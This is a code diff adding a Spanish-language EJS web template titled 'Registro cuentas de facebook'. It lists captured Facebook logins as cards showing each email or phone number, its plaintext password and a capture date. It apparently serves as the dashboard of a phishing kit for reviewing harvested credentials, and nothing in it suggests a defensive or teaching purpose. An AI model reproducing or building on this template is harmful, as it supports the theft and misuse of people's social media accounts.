@@ -1,0 +1,40 @@
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+
+<div class="container p-5">
+    <% if (Data.length > 0) { %>
+    <div class="container-fluid text-center mb-3">
+        <h2>Registro cuentas de facebook</h3>
+    </div>
+
+<div class="row d-flex justify-content-center">
+        <% Data.forEach(function(Data) { %>
+            
+    <div class="card mx-3 my-3" style="width: 25rem;">
+    <ul class="list-group list-group-flush text-left">
+                <li class="list-group-item">
+                   <strong>Correo:</strong> <%= Data.emailOnumber %>
+                </li>
+                <li class="list-group-item"> <strong>Contraseña:</strong> <%= Data.password %></li>
+                <li class="list-group-item"><strong>Fecha de registro:</strong> <%= Data.fecha_registro.toLocaleString() %></li>
+    </ul>
+</div> 
+<% }); %>
+</div>  
+<% }
+else{ %>  
+    
+<div class="container p-5">
+    <div class="row">
+    <div class="col-md-8 mx-auto">
+    <div class="card text-center">
+    <div class="card-body">
+        <h3>No hay registros</h1>
+        <p>En el momento no se encuentran datos registrados, Ingresa mas tarde
+        </p>
+    </div>    
+    </div>    
+    </div>
+    </div>    
+    </div>
+ <% } %>
+</div>
